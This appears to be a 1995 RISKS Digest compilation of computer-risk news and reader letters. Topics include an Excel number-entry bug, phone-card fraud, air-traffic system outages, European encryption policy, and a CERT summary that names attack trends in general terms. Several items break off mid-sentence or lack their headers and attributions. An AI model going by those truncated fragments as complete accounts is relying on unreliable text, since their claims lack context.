When does 1.40737488355328 = 0.64? When you're a user of Microsoft's Excel
spreadsheet.
<P>
For several years a (now well known) maths bug existed in the Calculator
applet that came bundled with Microsoft Windows. This remained uncorrected
in several releases over a considerable period of time.
<P>
A new maths related bug has now surfaced in another Microsoft product.
Type or paste 1.40737488355328 into a cell in a copy of Microsoft's
Excel spreadsheet and you will be rewarded, not with the number you
expect but with 0.64. If you perform arithmetic with this it will act as
if 0.64 had been entered so it is not simply a display error. When
the number is used as part of a formula the error is not apparent.
<P>
A friend who used to work in the UK investment banking business tells me
that much of the planning of the privatisation of most of Britain's state
owned industries was carried out using Excel. Perhaps we now have the real
explanation for the state of the British Economy?

Yet another weakness was discovered in Netscape's Internet software, found

"The flawed software isn't able to read very long numbers. An Internet user<BR>
could exploit the flaw by planting a bit of text containing a long number,
causing computers used by unsuspecting readers of the text to crash."  This
one is also being repaired.  [Abstracted by PGN from "Netscape Says Hackers

German Telecom suffered losses from a telephone card attack that was
detected recently, according to several German media reports.  A gang of
telephone card crackers, evidently based in Hamburg (but likely NOT related
to InFamous Chaos Computer Club :-), had analysed German Telecom's chipcard
program that controls telephone cells equipped with telephone cards readers,
and they found a trick whereby the card program automagically filled up
after completing any call to again hold the full amount of 50 DM.  The head
of the gang was jailed last week by UK police, and equipment (of the chief
programmer?) was confiscated in a Hamburg flat, including some "chipcard
simulation program".
<P>
Reports are (as often) rather contradictory; while some say that
manufacturing was "manual", others assume industrial production with a
damage of 1 billion DM (assuming that 1 Mio cards had been manufactured).
German Telecom informed that about 1,000 chipcards may have been
distributed, and that the damage so far amounted to less than 1 Mio DM.
Accordings to reports, German Telecom has changed essential parameters of
the chipcard control program so that such falsified telecards can no longer
work.  This change was activated from the central computer controlling all
telephone cells equipped with telephone chip-cards.  Moreover, one Sunday
newspaper (WamS) reports that a monitoring program was installed that from
the central computer can detect unusually heavy usage of telephone cells by
comparison with "normal use" (potentially something like an Intrusion
Detecting program, though likely not as advanced as NIDES :-) and give some
immediate alarm.

British Telecom has known for some time that about 9% of their public phone
boxes could be subverted by its software that permits some sort of escape
code to bypass charging.  However, knowledge of that code has now been
spreading like wildfire, resulting in lots of free calls.  BT is now
modifying the almost 12,000 phones thus affected.

From "Computing" 1995-09-21
<P>
London Underground is fighting to clean up its computer systems after one
of its own trainees hacked in and posted an offensive message on the digital
displays located above tube platforms around the capital.
<P>
Computing can reveal that on 16 August a message appeared on displays at
Piccadily, Elephant &amp; Castle and Regent's Park underground stations
declaring 'All signalmen are w***ers'.
<P>
The message went unnoticed by tube staff for more than 12 hours before being
removed. There were no complaints from the thousands of commuters. But,
despite being cleared, the message reappeared on tube station displays on 29
August.
<P>
Two days later, London Underground IT staff were called in to locate the
problem. The message had apparently been saved onto the system and was
randomly generated at the later date.
<P>
A London Underground spokesman told Computing: 'When we train people we
usually take them around on an induction course. It seems one of the
trainees obviously had more experience than the others. He managed to hack
into the computer, bypass the input codes and put a message on the dot
matrix displays.'
<P>
He added: 'The reappearance [of the message] was due to a technical glitch
and not a deliberate action. The trainee is no longer an employee.'

I saw the story about French Punched (post) Cards.  It reminds me of a true
story from the mid-60s.  I worked with an outstanding programmer, who was
blind.  He took a 2-week vacation, and while he was gone, several people ran
a program he had written.  Suddenly, it failed to work.  A later diagnosis
showed that:
<OL>
<LI>He used the cards with corners cut off so he could find his
place.
<LI>the card he used to mark the beginning of the data was blank
(see 3) and in backwards (a blank card turned over is still a blank card).
<LI>The computer was an IBM with a system that always read one card ahead,
thus the need for the blank card just before the data.
<LI>The first time
we ran his program, the card reader jammed (and wouldn't you know it) on the
blank card.
<LI>The operator went to fix the jam, saw the blank card in
backwards, and threw it away, thinking it was the problem.
<LI>It became
the problem, as that missing blank card was necessary for the program to
run.

I just discovered yesterday when I tried to boot Teleforms Version 4.0 from
Cardiff Software that the company unwittingly shipped the program earlier
this year with a built-in time bomb from a German company, re: Recognition,
that effectively shuts down all copies of version 4.0 when your system date
reaches 9-1-95. I don't know how many copies of Version 4.0 shipped, but the
tech support person I spoke to described the situation at their phone center
when the rogue code was discovered as "interesting." The official company
statement is that the vendor included a piece of demo code in the program
and failed to disable one line of code containing the timebomb. Cardiff is
providing a free patch file on its BBS and on CompuServe.

<P>
According to an article in `Communications Week International', the
34-nation Council of Europe has agreed to outlaw strong encryption products<BR>
which do not make keys available to governments.
<P>
The article, `Euro-Clipper chip scheme proposed', is on the front page of
the magazine's issue 151, dated 18th September, which arrived in my mail
this morning.
<P>
It relates that the policy was approved on the 8th September at Strasbourg
by the Council, and coincides with an attempt by the European Commission to
propose a pan-European encryption standard. The Council - unlike the
Commission - has no statutory powers to enforce its recommendations.
However, Peter Csonka, the chairman of the committee that drafted the
document (and an administrative officer at the Council's division of crime
problems) says that `it is rare for countries to reject Council of Europe
recommendations'.
<P>
The proposal would make telecomms operators responsible for decrypting
traffic and supplying it to governments when asked.  It would also `change
national laws to enable judicial authorities to chase hackers across
borders'.
<P>
Opposition to this measure was expressed by Mike Strezbek, VP responsible
for European telecomms at JP Morgan, who said that his organisation `will
challenge any attempt to limit the power of our network encryption
technologies very strongly'.
<P>
Czonka said that the Council had given consideration to business interests
but had tries to strike a balance between privacy and justice. However, `it
remains possible that cryptography is available to the public which cannot
be deciphered,' his document says. `This might lead to the conclusion to put
restrictions on the possession, distribution, or use of cryptography.'
<P>
Apparently another international organisation, the OECD, has called a
conference of its members in December to devise a strategy on encryption.
<P>
I for one will be making clear to my MP that his stand on this issue will
determine how I cast my ballot at the next election. I note that John Major
stated in a 1994 parliamentary written reply to David Shaw MP that the
government did not intend to legislate on data encryption.  I am
disappointed that government policy has changed to the point of supporting
the Council of Europe, and that this change has sneaked through during the
parliamentary recess.

Summarizing from the Pittsburgh Post-Gazette, 18 Sept 1995, page 1:
<P>
The loss of both radio and radar contact at Pittsburgh International Airport
briefly caused a "potentially dangerous situation, but no near misses."
According to the FAA, radio and radar contact was lost for less than a minute
before backup systems kicked in.  According to an air traffic controller on
duty, however, radio was out for about 90 seconds, and radar for five to eight
minutes.
<P>
"These things aren't supposed to happen, but it did," said Larry Buffalini, an<BR>
air traffic controller and vice president of the Pittsburgh local of the
National Air Traffic Controller Association.
<P>
Arlene Salac, spokeswoman for the FAA's eastern region, said a problem with
MCI telecommunications lines caused the problem.
<P>
Controllers used battery powered radios to stay in contact with the 38
flights in the local airspace.  The backup radar is turned on manually, and
takes five to eight minutes to come online according to Buffalini.  [So what
about the FAA's "less than a minute" estimate? - AT]  Salac's account
differed.  She said that, according to her briefing, the controllers had
immediate use of backup radar.
<P>
After recapping recent incidents familiar to RISKS readers, Salac states,
"To compare this to what happened in Chicago or Oakland is inappropriate.<BR>
It's not on the same scale.  Not that it's not important, but it doesn't
have the same range of impact.  Pittsburgh doesn't cover as wide an area."
Okay, I can't really argue with the area covered, but that seems to be a
pretty callous statement when you consider what could have happened, along
with the fact that a lot of people around here are still fairly upset about
USAir Flight 427 (which just marked its one year anniversary Sept 8), and
the fact that that problem still has not been found.

<P>
The FAA is investigating why two backup systems "failed to kick in" after
the power outage on 23 Sep 1995.  The backup generator that is supposed to
restore power in "5 or 6 seconds" didn't.  When the power came back, the
primary radar system "failed to restart as designed."  The secondary system
did restart, but it tracks only aircraft with transponders that respond to
radio probes from the ground.  In addition, controllers said its performance
was erratic.  After the third time the secondary system failed to work, the
controllers elected to switch over to the radar provided by the regional air
traffic control center in Cleveland (which I neglected to mention in
yesterday's post - AT).  This switch caused controllers to increase vertical
and horizontal separation between flights in the area.  According to the
FAA, 36 flights were delayed.
<P>
Duquesne Light (local power company - AT) could find no evidence of an
outage in the area, but could not rule one out.  A break in the system (a
limb on a wire is the example given) sits for 30 seconds before the system
tries to repair itself automatically.  If this works, no record is made.  If
it fails, a second attempt, after 4.5 minutes (it doesn't say if this is
after the original outage or after the repair attempt - AT) is recorded.
Local police reported that burglar alarms at two homes and a business went
off at about the same time, "often a sign of a power surge or power outage."
<P>
[Summarized from an article in the 19 Sep 1995 Pittsburgh Post-Gazette]<BR>
<P>
That's right.  It happened again.  Apparently, a tree limb had fallen
across a power line, and when workers were trying to remove it, it broke
the circuit, causing the tower to lose radar coverage.  Radio also was
out, but only for about a minute.
<P>
Isn't it curious that they've apparently backed off the "less than a
minute" claim in the original article?  Also, no direct FAA quotes this
time.  Kind of makes you wonder about the reports that no flights were in
danger.

This type of irresponsible behaviour is not at all unusual.  At McMaster
University the Computer Services group continues to use the student number
as logon id and e-mail address in spite of the fact that may Profs post
grades "anonymously" using student numbers.

&gt;The phone company eventually traced the calls to an abandoned oil tank<BR>
&gt;in Maryland. It was rigged to call the oil company when the oil level<BR>
&gt;was low, but the phone number was scrambled and it called her instead.
<P>
This story seems to be reported as a "truth is stranger than fiction"
story, but I think it's more important than that.  I'm sure most of us
have gotten mis-directed FAX calls before, but this is slightly different.
<P>
People would freak out if it had been an abandoned baby, the entity that had
done the abandoning would I'm sure be facing criminal charges as a result.
Is an abandoned oil tank any less serious though?  Is there no
decommissioning process for oil tanks?
<P>
The RISK may be that the tank was calling for help and nobody cared to
listen.  Did the tank start calling when they removed all oil from the tank,
or did it happen because the oil that was left there somehow got down below
the trigger level?  If the oil level went down, where did it go?
<P>
Another RISK may be that these details were made clear in the CNN
information, but as there was no synopsys, and the hot-link to the CNN story
is dead, I have no way of knowing.  Should an archive such as the one that
holds RISKS have as the major substance of one of the articles a link that
is likely to not be around in 2 more weeks, let alone on the 20th
anniversary of RISKS?

A recent issue of 2600 (a hacker magazine) had info on a supposed control
mode on Citibank ATM machines (the ones the the touch screen).  The article
went on to say that if you tapped the screen twice (a double click) it went
into a control mode with crude graphics and strange 'tap out your pin
number' interface.
<P>
The local CitiBank confirms my thoughts on this - it's a visually impaired
user mode.  It's public info and they will even supply an audio tape on how
to use it!

<P>
CitiBank bounced one of my checks a couple of months back.  The reason it
bounced is a classic human error / bad systems design risk.
<P>
I wrote a large check to the state of california to cover tax on a capital
gains (far too large IMHO but thats another issue).  To cover the check I
asked citibank to wire funds from a sterling account to my US dollar
citigold checking account. Knowing that transfers between these accounts
takes longer than they claim it does (a whole other issue between me and
them) I called my branch and told the what was going on.  They assured me
that since I had more than 5 times the check amount in other accounts they
would cover it.
<P>
It came as rather a shock when it bounced.
<P>
Panic ensued - CitiBank were horrified because they didn't know why it had
bounced.  I was horrified because the franchise tax board said they don't
re-present bad checks.  My accountant said don't worry the tax board do
re-present.  (an incidental risk - the tax board was right *they* don't
re-present but their bank *does* re-present once so the check cleared
without hurting my good rep with the tax folks).
<P>
Anyway it took three months and several more bounced checks from other
customers before citibank figured out what was happening:
<P>
Every morning the manager checks the system for overdrafts,  if he does not
override the system the checks bounce.  Unfortunately when he was trained
(way back when) you had to specify an account type code to do the overdraft<BR>
check.  In doing so accounts like mine (a citigold CMA type account) do
not show up!  If he had let it default (as new staff are trained to do)
he would have seen the citigold overdrafts.   The net effect of this is that
for a three month period this summer citibank in california was bouncing
random checks from it's best customers ...
<P>
The good news it they have learned from it and issued a memo to all managers
to ensure that everybody knows why it's happening.

&gt; The remaining call boxes have now been reprogrammed to be able to dial<BR>
&gt; only 911
<P>
That's a poor solution to the problem.  The 911 system is already
overburdened by people using it for non-emergency calls; some communities
even impose a fine for making non-emergency calls to 911.
<P>
I may be wrong in this assumption, but I'd imagine that most users
of highway call boxes are suffering from flat tires, overheated engines
and similar problems which don't require immediate emergency response.
<P>
Are you sure it's set to 911 and not local non-emergency police
numbers?  The one time I had to use a highway call box, in LA county,
it direct-dialed a non-emergency operator.  I don't remember if I got
a police operator or CalTrans.

A SpaceCom technician at their uplink facility in Tulsa, Oklahoma
accidentally send out a spacey command shutting down the satellite receivers
used by pager systems throughout the country, affecting millions of pagers.
SpaceCom supports 5 of the largest 10 paging outfits.  This happened at 1
a.m. yesterday, and each receiver had to be manually reprogrammed -- which
took all day until most of the service could be restored.  Al Stem, VP and
GM of SC said, "This hasn't ever happened before.  And we're putting
additional systems in place to make sure it never happens again."  [Source:
AP report, seen in the San Francisco Chronicle, 27 Sep 1995, p. A2.]

<P>
I recently received the following story from one of our customer engineers.
I am submitting it to the Risks Forum as a "good news" story.  Here is a
case were the system worked as designed (indeed, may have exceeded its
design limits) and saved a customer from a serious outage.  I have omitted
the name and location of the customer for obvious reasons.
<P>
This Stratus system manages a robotically-automated repair parts depot for
a major US railroad.  If the system is down equipment cannot be repaired.
<P>
On Friday, July 14, 1995 at approximately 6:00 pm, the computer room
air conditioning unit at the Maintenance Facility of the Railroad
registered an over-temperature condition.  This alarm is set to trip
at 80 degrees F.  The computer room is generally unmanned at this time
so there were no operators or any other personnel onsite to receive
the alarm.  This information has been extracted from the alarm logs
and has been confirmed.  The a/c compressor was failing and now the
fans were circulating the same air and the temperature was rising
steadily.
<P>
At Friday at 20:44:57 EDT the Railroad's Stratus system telephoned a
failure notification to the Stratus Customer Assistance Center (CAC)
in Marlboro reporting that the CPU in slot 30 had failed and had been
removed from service.  This failure may have been caused by the
increased temperature.
<P>
On Sunday at 12:58:00 EDT the system reported a second problem:  a
D604 disk drive had failed and had been removed from service, possibly
as a result of the increased temperature.  The system had been
operating in a over-temperature condition now for 42 hours.
<P>
During this time the Stratus CAC personnel had been trying to bring
the system back to normal and were attempting to contact the Railroad.
The Railroad personnel could not be reached.
<P>
The CE for the site was aware of the problem Sunday evening having
been notified by the Stratus e-mail system.  At 7:00 am Monday the CE
arrived at the Stratus office and attempted to contact the Railroad.
The customer returned the call at 9:00 am.  The CE advised the
customer that he would be on-site shortly to restore the system to
normal.
<P>
The parts, a CPU and a D604, were already onsite when the CE arrived.
The D604 was from a previous call not related to this problem.  The
computer room was still 110 degrees when the CE arrived onsite.  This
was 10 degrees cooler from the time the customer arrived.  He managed
this reduction by using desktop fan units from offices of Railroad
employees.  The Stratus module was operating with users even when
several other Railroad computers, including two systems from a
different vendor, had failed.  Further complicating the Railroad's
problems was the fact that the other vendor did not have any personnel
on-site and no phone support was evident.
<P>
The CE replaced the failed CPU in slot 30.  Two drives were out of
service.  One drive was setup and recovered and is still fully
operational, and one was replaced and recovered.  Both the CPU and
disk drive repairs were performed with the application online.  During
the entire time from 6:00 pm Friday to 9:00 am Monday, 63 hours, the
Stratus System performed in a environment which had reached
temperatures of 120 degrees and functioned without interrruption.  The
system was fully duplexed in less than one hour.  The two Brand X
systems which had shutdown completely were restored by 2:15 pm by the
customer.  He did not have the assistance of Brand X personnel either
onsite or by phone.
<P>
Stratus systems are designed to work at temperatures from 10 to 40 degrees
Celsius environment (50 to 104 degrees Fahrenheit), with humidity from 20 to
80% noncondensing.  We actually test them from 0 to 40 degrees C.  For our<BR>
Telephone "Central Office" models, we specify and test up to 50 degrees C --
122 degrees F.  The CO models are not significantly different from the<BR>
non-CO models.  The specification relates to the ambient temperature of the
room; it is not unusual for internal temperatures within the cabinet to be
20 to 30 degrees C higher.  The locations that run at this higher<BR>
temperature are designed to withstand it.
<P>
Unlike the other brand of equipment that this customer was using, we elect
to keep running, rather than shutdown, because we are aiming for continuous
availability.  In other words, we are trade off reduced equipment lifetimes
for higher levels of availability.  We're betting that, as in this case, a
few failures won't bring down the entire system and that the overall
situation can be discovered and repaired in time to prevent an application
outage.
<P>
Thus, I believe that our design and testing standards carried us thru this
heat wave, not luck or accident.

New methods of voting designed to replace the traditional polling place
and ballot box are a regular topic of discussion on RISKS.  The method
being discussed usually involves voting by phone or by computer.  The
state of Oregon is experimenting with a new voting method, but is using
a technology that may be older that the voting booth itself: the mail.
<P>
Sen. Packwood's replacement, to be elected on January 30, will be the
first member of the U.S. Congress ever elected in an all-mail election.
Ballots will be mailed out to all registered voters a few weeks before
the election date.  Voters fill out the ballots in their own home at
their leisure.  They can then either send them back through the mail,
or take them in person to a designated drop-off point.  All completed
ballots must arrive by January 30.
<P>
Oregon has used all-mail elections before for local elections, with pretty
good success.  But this will be the first time it has been tried in a
state-wide election.  No one claims to fully understand the risks involved,
so people will be watching this election very carefully.  Election officials
like all-mail elections because they don't have to set up any polling places
or find people to run them.  Most think that voter participation, long a
problem in the United States, will increase.  The potential for fraud is
greater, but most officials seem to have enough faith in the general public
that they are not worrying about it very much.  The timing of campaigns will
definitely change.  Any last-minute media blitz is useless because most
people will have already voted.

If you do this on a Macintosh (Excel v5.0a on a PowerMac 8100/110) you get

McMaster's use of student numbers in email is indeed odd (not to mention
making it very difficult to remember undergrad email addresses!)
<P>
Is it even legal?  I was under the impression that, under Canada's access
to information and privacy laws, the open publication of university
student numbers (i.e. providing grades on office doors) is not allowed,
but is continued simply due to the fact that there has been little
resistance to this long-standing practice.
<P>
If it is not illegal, perhaps it should be: posting a printed list on a
professor's door is one thing; having it correlated electronically to one's
name is another issue entirely.

<P>
The woman being haunted by the mystery calls lives near me.  The local
newspaper had a much more thorough coverage of the story. Here are the
facts:
<P>
The "oil tank" was a home heating oil tank in a private residence.  It
was not a million-gallon monster owned by an oil company.
<P>
The tank had an auto-dialer attached, and was programmed to call the
heating oil service company when the oil level fell.  They would then
dispatch a truck to top the tank off.
<P>
Years ago the heating oil service company went out of business.  The
phone company reclaimed the 800-service telephone number that the
auto-dialers used. (Do you see where this is going?)
<P>
The 800 number was assigned to a _business_ in Massachusetts.  It was
set up for nation-wide availability, and connected to a FAX machine.  The
business is quite small, and is run by its owner from her home office.
<P>
An electrical storm happened in Maryland.  Apparently a nearby strike
somehow woke up the auto-dialer.  The business in Massachusetts starts
to get late night "hang-up" calls.
<P>
The calls were finally traced.  The retiree that owned the tank knew
nothing about the auto-dialer, and said she was very sorry that her oil
tank was making crank calls.
<P>
The real risk seems to be assuming that the public news organizations
understand anything technological.  A secondary risk, as Sean pointed
out, is that no one was responsible for making sure that _all_ the
auto-dialers were disconnected, when the oil company went bankrupt.  I
wonder how many more of them, still programmed to that 800-number, are
still waiting for their "wakeup" call?

CERT Summary CS-95:02<BR>
September 26, 1995
<P>
The CERT Coordination Center periodically issues the CERT Summary to draw
attention to the types of attacks currently being reported to our incident
response staff. The summary includes pointers to sources of information for
dealing with the problems. Starting with this summary, we will also list new
or updated files that are available for anonymous FTP from <A HREF="ftp://info.cert.org">ftp://info.cert.org</A>
<P>
Past CERT Summaries are available from

---------------------------------------------------------------------------
<P>
<H3>Recent Activity</H3>
Since the July CERT Summary, we have seen these continuing trends in incidents
reported to us:
<P>
1. Sendmail Attacks
<P>
We receive several reports each week of attacks through sendmail, with
intruders using a variety of techniques. Most of the attacks are aimed at
gaining privileged access to the victim machine.
<P>
To combat these threats, we encourage sites to take the appropriate steps
outlined in the following:
<P>
<A HREF="ftp://info.cert.org/pub/cert_advisories/CA-95:11.sun.sendmail-oR.vul">ftp://info.cert.org/pub/cert_advisories/CA-95:11.sun.sendmail-oR.vul</A><BR>

<A HREF="ftp://info.cert.org/pub/cert_advisories/CA-95:08.README">ftp://info.cert.org/pub/cert_advisories/CA-95:08.README</A>
<P>
A number of sites have reported some confusion on the need to continue using
the sendmail restricted shell program (smrsh). You need to run the smrsh tool
in conjunction with the most recently patched version of sendmail for your
system.
<P>
Information on the smrsh tool can be obtained from these places in

<P>
It is included in the sendmail 8.7 distribution.
<P>
2. Network Scanning
<P>
Several incidents have recently been reported in which intruders scan a large
address range using the Internet Security Scanner (ISS). As described in CERT
advisory CA-93:14, this tool interrogates all computers within a specified IP
address range, determining the security posture of each with respect to
several common system vulnerabilities.
<P>
Intruders have used the information gathered from these scans to compromise
sites. We are aware of many systems that have suffered a root compromise as a
result of information intruders obtained from ISS scans.
<P>
You may wish to run ISS against your own site in accordance with your
organization's policies and procedures. ISS is available from

3. Exploitation of rlogin and rsh
<P>
We have received some reports about the continued exploitation of a
vulnerability in rlogin and rsh affecting IBM AIX 3 systems and Linux systems.
This is not a new vulnerability, but it continues to exist. Sites have
reported encountering some Linux distributions that contain this
vulnerability.

<P>
4. Packet Sniffers
<P>
We continue to receive new incident reports daily about sniffers on
compromised hosts. These sniffers, used to collect account names and
passwords, are frequently installed using a kit. In some cases, the packet
sniffer was found to have been running for months. Occasionally, sites had
been explicitly warned of the possibility of such a compromise, but the
sniffer activity continued because the site did not address the problem in the
comprehensive manner that we suggest in our security documents.
<P>
Further information on packet sniffers is available from

<P>
The International Herald Tribune for Monday Oct 2, p1, has a report on a
DC10, NorthWest Flight 52, on its way to Frankfurt from Detroit.  They
landed in Brussels, much to everyone's surprise except for the passengers,
cabin crew and air traffic control.
<P>
A controller in Shannon changed the destination in the en-route computers
for some reason no-one has fathomed. So everyone after that sent NW52
merrily on the way to Brussels. The cabin crew and passengers noticed,
because the cabin flight-path display was showing them going to Brussels
rather than to Frankfurt (the cities are 200miles=325km away from each
other).  The flight crew first noticed when they broke out under the clouds
on approach to Brussels, and noticed that the layout of the airport was not
similar to Frankfurt.  Sensibly, they decided to continue the landing. And
will remain landed until the investigation figures everything out. A
spokesman for NorthWest pointed out that the crew *should* have known where
they were.......
<P>
That reminds me of the time I was flying Chicago to SFO and following the
ground on my WAC (World Aeronautical Chart). The routing went south of the
Colorado/Wyoming boundary, past Aspen, and then over the Green river canyon,
which is some 250km past Aspen. Just then, the captain announced "We're just
passing Aspen, Colorado, out of the left window." But we got there OK.  Even
United pilots can recognise the Mina and Coaldale transitions to the Modesto
arrival when it hits them ;-)

I have a fax that I have received from the Systems Engineering Society.  In
the footer, it says "Internet: SESociety508-420-0210ol.com" Since I know
that the address is @aol.com, it seems that something has substituted the
outgoing fax number for the "@a".
<P>
The root cause appears to be that the formerly rare character "@"
has become more frequently used, making it no longer appropriate
as an escape sequence.

<P>
The following is taken from a report in the Independent (a UK quality paper)
for Tuesday 3 October 95. The headline is `Court computers in countdown to
chaos'.
<P>
Programming work is underway to prevent thousands of court cases being
called for 31 Dec 99.
<P>
`The Lord Chancellor's department is implementing the scheme to prevent<BR>
legal chaos caused because aging court computers cannot speak Latin or
understand the concept of eternity.'
<P>
The problem is that many cases are adjourned `sine die' (literally `without
date') when they need to be disposed of without reaching any sort of verdict.
The intention is that they are never seen again. The computers used for
scheduling court hearings can't cope with this so clerks in some courts
have been entering the latest date that the machine knows about---31 Dec 1999.
This means that on 30 December these systems will print a huge list of
all these cases, for hearing the next day. The article suggests that up
to 25,000 cases may be involved in some inner city courts. The exact size of
the problem is unclear as other clerks in other courts may have used other
tricks to get round the problem. A computer `expert' is quoted:
<P>
`When the first systems were introduced 25 years ago, the last day of 1999<BR>
was still a long way off and it did not matter if these cases were adjourned
until that date. It is only just over four years away and we have got to
do something about it. Fortunately, computer software has advanced and the
courts will not have to record false dates under the new system.'
<P>
My comments: the concept of `sine die' has been around for hundreds of years,
it really should have been in the original specification for the system.
Also, if 31 Dec 99 is the latest date the system can cope with, it has
bigger problems than just dealing with `sine die' cases. It won't be
able to adjourn any cases to known, fixed, dates in 2000 and beyond.

<P>
It seems the phone monopoly, KPN, had some problems restyling the phone
directory of Utrecht. The restyling involved adding a 'yellow pages' kind of
index to the alphabetical section, and the possibility of advertisements in
the alphabetical section of the directory.  The Utrecht directory was
recalled because of a lot of errors; it seems that about 10% of entries was
corrupted one way or the other.  Newspapers reported at the time the cause
was 'computer error' while merging the list of subscribers with the list of
advertisers.
<P>
Now, nearly a year later, KPN/PTT still does not have its data right.  No
directories have been published since. For Amsterdam, where I live, this
means the directory will be published in January of February 1996 instead of
the original may 1995. Other cities will have approximately the same delays.
<P>
While the subscriber database is correct, the advertisers database is
not, it seems. The subsidiary of KPN responsible for the directories,
Telemedia, told me this:
<UL>
<LI>They are very busy calling all advertisers to confirm the data.
Their databases seem messed up somehow.
<LI>The information service doesn't have more detailed business
information either. That is supposed to come from Telemedia, who
don't have it.
</UL>
<P>
The being unavailable of directories causes quite some problems. Phone
numbers tend to change quickly here, as it is often not possible to
keep your number even when moving to another part of the city. And even
government or business numbers are quickly given to private subscribers
who will then probably not be happy.
<P>
The RISK here is having a lot of calls arrive at the wrong destination.
Having a monopoly run the phone system is probably the biggest cause
here, followed by trusting your (computer) systems and procedures.

Here is a great report about someone getting involved.

911 phone line crossed

RICHMOND, Va. (AP) -- When Rosa H. Dickson answered her telephone, the
caller requested an ambulance.  It took only a moment to figure out that the
caller had dialed 911 and got Dickson instead.  "When I realized what
happened, I dialed 911 and couldn't get 911," she said Monday.

and then called in again later when nothing happened.  Bell Atlantic

For those who are not familiar with this part of the world, Delhi Electric
Supply Undertaking (DESU) is the name of a company that supplies electricity
to the city of Delhi, the capital of a country called India. The company has
been using a computer to make the electric bills of its customers for quite
some time now (the trouble starts!).  One fine morning about a year back,
the computer decided to print wrong customer codes on the monthly bills it
produced for some privileged persons like me. Since the code is long (18
alphanumeric characters!), nobody noticed the mistake.
<P>
With good faith, I paid the bill. As you might expect, next month I saw an
arrear amount on my bill. When I took it to DESU's office, they had several
theories on how the error might have occurred. They did an ad hoc correction
on the bill (hardcopy). The same game continued for an year till, another
fine morning, I got a notice for disconnection, the ultimate punitive action
from DESU for non-payment of bills!
<P>
A number of panic-calls to the top-brass of the company later, I came to
know the reason. The mystery of the misbehaviour of the computer is still
unknown -- it could probably be a software bug!  More stunning was the fact
that while some of the dealing clerks knew about the problem, they pleaded
helplessness and seemed to be at the mercy of the computer. The matter
becomes worse as the responsibilities of the preparation of the bills,
receipt of payments and the issue of the notices rest with different
departments, with the computer gracefully occupying the centre- stage.
<P>
Though my immediate problem (disconnection threat) has been taken care of,
DESU cannot assure me that I shall get a correct bill next month or that I
shall not get yet another funny disconnection notice. As this moment, I remain
under the threat of the monster computer that is probably churning out yet
another wrong bill, either for me or for somebody else.
<P>
Though this story is a pretty low-tech one than those usually discussed at
the RISKS forum, the moral remains the same: Computers (for the matter,
technology in any form) should never become the boss!

<P>
In regards to the `success' story about the STRATUS system, where a room
full of computers survived baking in 120oF heat for 3-4 days with only 2
disk drives failing, this story is remarkable in that it completely
overlooks the inevitable degradation of the electronic equipment at that
site that did NOT fail immediately during the overheating episode. Excessive
temperatures degrade electronic components and reduce their life expectancy
considerably.  For 3-4 days the hardware baked itself in 120oF conditions
without notifying anyone of the underlying problem.  Over the weeks and
months to come after this episode, the owners can expect a
higher-than-normal failure rate of the equipment so exposed.
<P>
Had the STRATUS system included a temperature alarm to a central office,
something on the order of, "Hey, guys, my A/C is out and it's over 100 in
here - HELP!"  STRATUS might have not only saved the drives that immediately
failed due to the heat but also the other equipment that will inevitably
fail early as well.
<P>
In a sense, this reveals another RISK of modern computers/electronic
equipment; the inability to always diagnose and report to the operators what
is REALLY wrong with the system, even if you have designed a sophisticated
diagnostic/reporting capability into the system.
<P>

<P>
This reminds me of a story told by my faculty advisor back in college.  In
his graduate school days he worked on one of the original UNIVAC mainframes
in the country.  That machine comprised dozens of racks of vacuum
tube-technology logic boards stacked in banks up to the ceiling in their
computer room.  Each board controlled a different function in the computer
and he said that after a while he could tell from the error returned in a
malfunction not only which board had failed but also the most likely vacuum
tube that had gone out.  Usually the failure was blamed on excessive heat,
because even with the room's central A/C going full blast the heat from the
tubes kept it nice and toasty in there, especially around the ceiling.
<P>
His EE department was always complaining about the high tube failure
rate due to excessive heat so finally the school ordered a newer,
bigger A/C for them.  Unfortunately, when they came to install it, the
electricians forgot to tell anyone that they were shutting off the A/C
power at the breaker box.  So the computer kept running...
<P>
...the first anyone knew what was happening was when they heard explosions<BR>
from the computer room, as boards blew up starting from the top racks and
then down to the bottom racks, one bank at a time.  My advisor said it took
them 3 months to rebuild the system and when they finished, they welded the
A/C panel box shut.
<P>
The RISKS of the right hand not knowing what the left had is doing are
obvious.

Interestingly enough., Excel v5.0a on a Mac IIsi also yields .64; however,
if you paste the original number as text and then perform a math operation,

<P>
What I find interesting (and disturbing) is not that some number that most
people will never use behaves oddly, but that the program behaves oddly.
I'm working on a project that will use digital controls for power plant
applications, and as part of that we need to verify that the system responds
as expected during operations and transients.  I wonder how we will be able
to test for obscure bugs such as this (since if one number does this, what
other features haven't we yet encountered).  More importantly, we need to
design the system to tolerate such undiscovered flaws and not go nuts when
it does (a daunting task).

Ross Anderson reported a proposal from the Council of
Europe to ban strong encryption within Europe, and to introduce a
'Euro-Clipper'.  I have to say that I think the article he reports jumps<BR>
the gun somewhat.  The actual proposal reads (in the relevant section)
<P>
"<U>V. Use of Encryption</U>
<P>
14. Measures should be considered to minimise the negative effects of the
use of cryptography on the investigation of criminal offenses, without
affecting its legitimate use more than is strictly necessary."
<P>
The UK already allows a Police Constable to obtain a warrant requiring
a suspect to produce all information on his computer 'in legible format'
ie de-crypted, and I suspect this is all that will be required to meet
the proposal.
<P>
This is not of course to say that there are not people about contemplating
doing just what Ross relates.  They are usually sat on a fat surveillance
budget, and wondering how they will justify it next year.

<P>
A new computerised dispatch system for the Metropolitan Ambulance Service
(MAS) (Melbourne, Victoria) has run into some difficulties. According to a<BR>
report in `The Age' newspaper by Thom Cookes (17/10,p.35), an independent
consultant's report identified more than fifty faults labelled `critical' or
`high priority'. The dispatch system is now operating with some of the<BR>
faults still outstanding.
<P>
The system's supplier, Intergraph, has installed more than 160 similar
systems around the world. However, it is the first time that the company has
supplied both system and staff. It is believed that this may have resulted
in less scrutiny being applied to any reported faults.
<P>
The outstanding problems are believed to be with:
<OL>
<LI>Automatic Vehicle Location, which uses satellites to keep track of
ambulances. Too much information is causing the system to `bog down' and
report incorrect locations.
<P>
<LI>Automatic route recommendation, which suggests the best way for an ambulance
to get to an incident. No statistical tests have been applied. However on
simple tasks, the system recommended routes heading in the opposite direction
from the accident scene.
<P>
<LI>Allocating a vehicle to a job can take up to two minutes, during which
the console is `locked up'.
</OL>
Intergraph has argued that any faults in the system would show up in the log
files generated daily and provided to the MAS and government. However the
consultant's report flagged the report generator as also containing critical
faults. In particular, the system does not accurately time how long it takes
to respond to a call. Responses taking longer than 16 minutes are meant to
generate an exception report. A test, where the response time was 25
